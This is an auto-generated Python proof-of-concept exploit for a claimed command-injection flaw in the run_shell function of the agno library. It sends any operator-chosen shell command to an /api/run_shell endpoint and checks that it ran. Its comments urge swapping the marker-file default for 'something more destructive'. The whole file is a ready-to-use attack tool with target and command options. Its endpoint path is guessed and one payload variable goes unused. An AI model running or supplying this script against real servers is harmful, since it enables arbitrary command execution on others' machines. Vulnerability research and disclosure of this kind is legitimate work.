#!/usr/bin/env python3
# PoC for agno (/tmp/agno/libs/agno)
# Path: rce-024
# Sink: run_shell
# Auto-generated — run with: python3 rce_inject_arbitrary_commands_run_shell.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for agno RCE vulnerability.

Vulnerability: Command injection in run_shell() via shell metacharacters.
The _check_command() method only blocks path traversal patterns (e.g., '../'),
but does not filter shell metacharacters like ;, &&, |, $(), etc.

Impact: An attacker can execute arbitrary shell commands on the server.
"""

import argparse
import sys
import urllib.request
import urllib.error
import urllib.parse
import json
import time

# Default target - change as needed
DEFAULT_TARGET = "http://localhost:8000"
DEFAULT_TIMEOUT = 10

def send_payload(target_url, command):
    """
    Send a malicious command to the vulnerable run_shell endpoint.
    
    The payload uses shell metacharacters to inject additional commands
    after the intended command. The _check_command() only looks for '../'
    patterns, so ';' and other metacharacters pass through.
    """
    # Benign payload that creates a marker file to prove RCE
    # Change to something more destructive for actual testing
    benign_payload = f"echo hello; touch /tmp/poc_success_{int(time.time())}.txt"
    
    # URL encode the command to handle special characters
    encoded_command = urllib.parse.quote(command)
    
    # Construct the full URL - adjust endpoint path as needed
    # The vulnerable function is typically exposed via an API endpoint
    url = f"{target_url}/api/run_shell?command={encoded_command}"
    
    print(f"[*] Sending payload to: {url}")
    
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=DEFAULT_TIMEOUT) as response:
            result = response.read().decode('utf-8')
            print(f"[+] Response received (status {response.status}):")
            print(result[:500])  # Show first 500 chars
            return result
    except urllib.error.HTTPError as e:
        print(f"[-] HTTP Error: {e.code} - {e.reason}")
        print(f"[-] Response body: {e.read().decode('utf-8')[:200]}")
        return None
    except urllib.error.URLError as e:
        print(f"[-] URL Error: {e.reason}")
        return None
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return None

def verify_exploit(target_url):
    """
    Verify the exploit worked by checking if the marker file was created.
    Uses a second command to check for the file's existence.
    """
    check_cmd = "ls -la /tmp/poc_success_*.txt 2>/dev/null || echo 'No marker file found'"
    print("\n[*] Verifying exploit success...")
    result = send_payload(target_url, check_cmd)
    
    if result and "poc_success_" in result:
        print("[+] EXPLOIT SUCCESSFUL! Marker file created.")
        return True
    else:
        print("[-] Could not verify exploit - marker file not found.")
        return False

def main():
    parser = argparse.ArgumentParser(
        description="agno RCE PoC - Command injection in run_shell()",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -t http://target:8000
  %(prog)s -t http://target:8000 -c "id; whoami"
  %(prog)s -t http://target:8000 --verify-only
        """
    )
    
    parser.add_argument(
        "-t", "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    
    parser.add_argument(
        "-c", "--command",
        default=f"echo POC_SUCCESS; touch /tmp/poc_success_{int(time.time())}.txt",
        help="Command to execute (default: create marker file)"
    )
    
    parser.add_argument(
        "--verify-only",
        action="store_true",
        help="Only verify if previous exploit succeeded"
    )
    
    parser.add_argument(
        "--timeout",
        type=int,
        default=DEFAULT_TIMEOUT,
        help=f"Request timeout in seconds (default: {DEFAULT_TIMEOUT})"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("agno RCE Proof-of-Concept Exploit")
    print("=" * 60)
    print(f"[*] Target: {args.target}")
    print(f"[*] Timeout: {args.timeout}s")
    print()
    
    if args.verify_only:
        verify_exploit(args.target)
    else:
        print(f"[*] Executing command: {args.command}")
        print("[*] Note: Using benign payload by default (creates marker file)")
        print("[*] For testing, change -c to something more impactful\n")
        
        result = send_payload(args.target, args.command)
        
        if result:
            print("\n[*] Checking if command executed successfully...")
            verify_exploit(args.target)
        else:
            print("\n[-] Exploit attempt failed - no response received")
            sys.exit(1)

if __name__ == "__main__":
    main()
